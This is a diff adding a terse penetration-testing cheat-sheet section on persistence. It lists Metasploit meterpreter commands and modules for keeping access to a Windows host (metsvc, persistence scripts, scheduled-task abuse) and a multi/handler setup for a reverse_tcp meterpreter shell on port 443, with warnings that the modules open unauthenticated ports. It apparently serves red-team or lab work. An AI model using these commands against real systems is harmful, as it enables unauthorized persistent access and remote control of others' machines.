@@ -1,0 +1,32 @@
+ii. Persistence
+
+metsvc
+	Metasploit meterpreter
+		run metsvc -A
+
+Persistence Scripts
+	Metasploit meterpreter
+		run persistence -h
+
+	THIS IS A DANGEROUS MODULE TO RUN
+	Opens a port on the machine without credentials
+	Must be explicitly closed and removed from registry when done
+
+	Exploit/windows/local/persistence
+
+	Exploit/windows/local/registry_persistence
+
+Scheduled Tasks
+	Metasploit meterpreter
+		run scheduleme
+		run schtasksabuse
+
+	THESE ARE DANGEROUS MODULES TO RUN
+	Open a port on the machine without credentials
+	Must be explicitly closed and removed from registry when done
+
+	Require listener (e.g. reverse_tcp listening on 443)
+	use /exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp  
+	set port 443   
+
